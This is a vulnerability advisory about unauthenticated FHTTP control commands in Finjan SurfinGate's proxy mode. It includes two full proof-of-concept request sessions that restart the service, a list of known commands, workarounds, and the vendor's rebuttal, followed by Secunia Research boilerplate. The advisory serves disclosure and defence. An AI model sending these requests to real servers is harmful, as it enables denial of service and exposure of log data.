VENDOR:       Finjan ([www.finjan.com](http://www.finjan.com))
PRODUCT:      SurfinGate (recently renamed Vital Security)
VERSIONS:     All releases of versions 6 & 7 as of 1/22/2004.
              Older versions have not been tested.
NOTIFICATION: The vendor has known of the problem over a year

DESCRIPTION
==========================================================
Finjan SurfinGate provides malicious code scanning for web traffic. It focuses on \
behavior-based filtering of active content (e.g. ActiveX, Java, scripting), but also \
integrates a McAfee virus scanner.

PROBLEM
==========================================================
When running in proxy mode, properly crafted requests sent to Finjan SurfinGate can \
mimic control commands. Known vulnerabilities include viewing log data and causing \
the service to restart, potentially resulting in a DoS situation. The applications \
architecture suggests there is a potential for modifying the filtering policy as \
well.

DETAILS
==========================================================
SurfinGate scanning servers receive commands by listening on a control port (TCP/3141 \
by default) for an HTTP-based protocol called FHTTP. Normally the FHTTP commands \
come from a management console or policy database server, but commands are not \
authenticated and can come from any source, including the local HTTP proxy. This \
allows any user to issue server commands via the proxy server.

The finjan-parameter-type parameter is the actual command. Known commands include \
restart to restart the service, getlastmsg to view log information and online \
to force a policy update from the database server. Running strings on the server \
binary (bin/FinjanServer) reveals other possible targets.

EXPLOITS
==========================================================
Below are two examples of sessions with the proxy server that issue a restart \
command.

     Example 1:
          >>> CONNECT LOCALHOST:3141 HTTP/1.0
          >>>

          <<< HTTP/1.0 200 Connection established
          <<< Proxy-agent: Finjan-SurfinGate/6.0
          <<<

          >>> FINJAN /stam HTTP/1.0
          >>> finjan-version: fhttp/1.0
          >>> finjan-command: custom
          >>> finjan-parameter-category: console
          >>> finjan-parameter-type: restart
          >>> content-length: 0
          >>>

          <<< HTTP/1.0 200 OK
          <<< finjan-version: fhttp/1.0
          <<<
          <<<

     Example 2:
          >>> FINJAN localhost:3141/stam HTTP/1.0
          >>> finjan-version: fhttp/1.0
          >>> finjan-command: custom
          >>> finjan-parameter-category: console
          >>> finjan-parameter-type: restart
          >>> content-length: 0
          >>>

          <<< HTTP/1.0 200 OK
          <<< finjan-version: fhttp/1.0
          <<<
          <<<

WORKAROUNDS
==========================================================
Firewall filtering will is not adequate since the commands come over the same port \
that services legitimate HTTP requests. These are possible workarounds that have been \
successfully tested.

* Use a proxy server between the user and SurfinGate server to block CONNECT commands \
to ports other than 443 AND block non-standard HTTP commands (i.e. FINJAN).

* Inside the SurfinGate policy, add URL rules to block all access to any hostname or \
IP address that would connect to the FHTTP port. This can be a long list; localhost, \
127.0.0.1, the hostname, loghost for Solaris machines, the IP address SurfinGate \
binds to, any DNS entries, etc.

* Change the control port to something besides 3141. This is pretty weak, but better \
than nothing.

NOTES
==========================================================
Just to reiterate, the ability to change the policy has not been confirmed, but seems \
likely. The SurfinGate database server and SurfinShield (a desktop product) database \
server also use FHTTP for management commands, so that is a likely source for more \
vulnerabilities to explore. Because the SurfinGate scanning/proxy server has to \
communicate with the database server using FHTTP, there is guaranteed access to the \
database via the proxy if the hostname or IP address is known. The workarounds listed \
above should also work for restricting access to the database server, but have not \
been tested.

Finjan Response to David Byrne's
"Finjan SurfinGate Vulnerability"
Dated January 23, 2004

David Byrne contacted Finjan Software a year ago, and based on his
comments we issued a detailed alert to our customers. We explained that
the control port is NOT used to change security policies within our
software. David's suggested vulnerability is limited to a DoS attack,
and it can be easily eliminated by a small change in the system
configuration.

David's most recent comment is:

"Inside the SurfinGate policy, add URL rules to block all access to any
hostname or IP address that would connect to the FHTTP port. This can be
a long list;
localhost, 127.0.0.1, the hostname, loghost for Solaris machines, the IP
address SurfinGate binds to, any DNS entries, etc."

Once again, this suggested vulnerability is easily addressed. The
solution is to simply block any connection to "*:ControlPort" (3141 is
the default).

Finjan welcomes expert input and suggestions. Please feel free to
contact us at support@finjan.com.

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
